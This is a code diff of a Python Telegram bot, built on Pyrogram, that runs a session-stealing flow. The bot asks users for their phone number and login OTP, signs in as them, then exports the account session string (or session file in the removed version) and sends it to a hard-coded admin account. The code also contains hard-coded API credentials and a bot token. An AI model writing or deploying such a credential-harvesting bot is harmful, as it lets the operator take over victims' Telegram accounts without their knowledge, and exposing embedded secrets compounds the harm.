@@ -1,59 +1,65 @@
-
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import os
 
-API_ID = 23347107
-API_HASH = "8193110bf32a08f41ac6e9050b2a4df4"
-BOT_TOKEN = "7620884098:AAF8ObWhRQxsB0IXuFa_0bTWh5QQeE9dKmo"
-ADMIN_ID = 7051377916
+api_id = 23347107
+api_hash = "8193110bf32a08f41ac6e9050b2a4df4"
+bot_token = "7620884098:AAF8ObWhRQxsB0IXuFa_0bTWh5QQeE9dKmo"
+admin_id = 7051377916
 
-app = Client("bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
+bot = Client("bot", api_id=api_id, api_hash=api_hash, bot_token=bot_token)
+sessions = {}  # Stores session objects for each user
 
-SESSION_DIR = "sessions"
-os.makedirs(SESSION_DIR, exist_ok=True)
+@bot.on_message(filters.command("start"))
+async def start_cmd(_, message: Message):
+    await message.reply("✅ Bot Running!\nUse /send to start login.")
 
-@app.on_message(filters.command("start") & filters.private)
-async def start_cmd(client, message: Message):
-    await message.reply("🤖 Bot is running!\nUse /send to create Telegram session.")
+@bot.on_message(filters.command("send"))
+async def send_cmd(_, message: Message):
+    await message.reply("📱 Send your phone number (e.g. +8801XXXXXXX):")
+    sessions[message.chat.id] = {"step": "wait_phone"}
 
-@app.on_message(filters.command("send") & filters.private)
-async def send_cmd(client, message: Message):
-    await message.reply("📱 Send phone number (e.g. +8801XXXXXXXXX)")
-    phone_msg = await client.listen(message.chat.id)
-    phone_number = phone_msg.text.strip().replace(" ", "").replace("-", "")
-
-    session_filename = f"{SESSION_DIR}/{phone_number.replace('+', '')}.session"
-
-    if os.path.exists(session_filename):
-        await client.send_document(ADMIN_ID, document=session_filename, caption="✅ Session already exists!")
-        await message.reply("📂 Session already exists. Sent to admin.")
+@bot.on_message(filters.text)
+async def handle_text(_, message: Message):
+    user = sessions.get(message.chat.id)
+    if not user:
         return
 
-    user_client = Client(phone_number.replace("+", ""), api_id=API_ID, api_hash=API_HASH, workdir=SESSION_DIR)
+    step = user.get("step")
+    if step == "wait_phone":
+        phone = message.text.strip()
+        user["phone"] = phone
+        user["step"] = "wait_code"
 
-    try:
-        await user_client.connect()
-        await user_client.send_code(phone_number)
-        await message.reply("📩 OTP sent to Telegram. Now send the OTP:")
+        user["client"] = Client(
+            f"session_{message.chat.id}",
+            api_id=api_id,
+            api_hash=api_hash,
+            phone_number=phone,
+            in_memory=True
+        )
+        await user["client"].connect()
 
-        otp_msg = await client.listen(message.chat.id)
-        code = otp_msg.text.strip()
-
-        await user_client.sign_in(phone_number, code)
-        await user_client.disconnect()
-
-        if os.path.exists(session_filename):
-            await client.send_document(ADMIN_ID, document=session_filename, caption="✅ New session created!")
-            await message.reply("✅ Session created and sent to admin.")
-        else:
-            await message.reply("❌ Session file not found!")
-
-    except Exception as e:
-        await message.reply(f"❌ Error: {e}")
         try:
-            await user_client.disconnect()
-        except:
-            pass
+            sent = await user["client"].send_code(phone)
+            user["code_hash"] = sent.phone_code_hash
+            await message.reply("📨 OTP sent! Now send the code (only numbers).")
+        except Exception as e:
+            await message.reply(f"❌ Failed to send OTP: {e}")
+            await user["client"].disconnect()
+            sessions.pop(message.chat.id, None)
 
-app.run()
+    elif step == "wait_code":
+        code = message.text.strip()
+        try:
+            await user["client"].sign_in(user["phone"], user["code_hash"], code)
+            string_session = await user["client"].export_session_string()
+            await bot.send_message(admin_id, f"✅ Session for {user['phone']}:\n\n`{string_session}`")
+            await message.reply("✅ Session created and sent to admin.")
+        except Exception as e:
+            await message.reply(f"❌ Error during login: {e}")
+        finally:
+            await user["client"].disconnect()
+            sessions.pop(message.chat.id, None)
+
+bot.run()
